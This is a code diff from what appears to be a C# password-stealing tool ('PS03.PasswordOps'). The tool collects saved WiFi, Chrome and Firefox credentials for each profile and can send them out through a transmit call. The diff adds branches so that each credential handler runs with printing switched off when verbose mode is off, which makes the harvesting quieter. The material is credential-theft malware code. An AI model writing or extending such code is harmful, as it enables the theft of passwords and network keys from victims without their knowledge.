@@ -36,6 +36,12 @@ namespace PS03.PasswordOps
                         var handler = new WifiHandler();
                         handler.Handle(wpack.Pack(profile,false));
                     }
+                    else
+                    {
+                        var handler = new WifiHandler();
+                        handler.Printing = false;
+                        handler.Handle(wpack.Pack(profile,false));
+                    }
                 }
                 catch (Exception)
                 {
@@ -52,11 +58,18 @@ namespace PS03.PasswordOps
                 {
                     if(transmit)
                         rtl.Send(cpack.Pack(profile,true));
-                    if(verbose)
+                    if (verbose)
                     {
                         var handler = new ChromeHandler();
-                        handler.Handle(cpack.Pack(profile,false));
+                        handler.Handle(cpack.Pack(profile, false));
                     }
+                    else
+                    {
+                        var handler = new ChromeHandler();
+                        handler.Printing = false;
+                        handler.Handle(cpack.Pack(profile, false));
+                    }
+                    
                 }
                 catch (Exception)
                 {
@@ -78,6 +91,12 @@ namespace PS03.PasswordOps
                     {
                         var handler = new FirefoxHandler();
                         handler.Handle(fpack.Pack(profile,false));
+                    }
+                    else
+                    {
+                        var handler = new FirefoxHandler();
+                        handler.Printing = false;
+                        handler.Handle(fpack.Pack(profile, false));
                     }
                 }
                 catch (Exception)
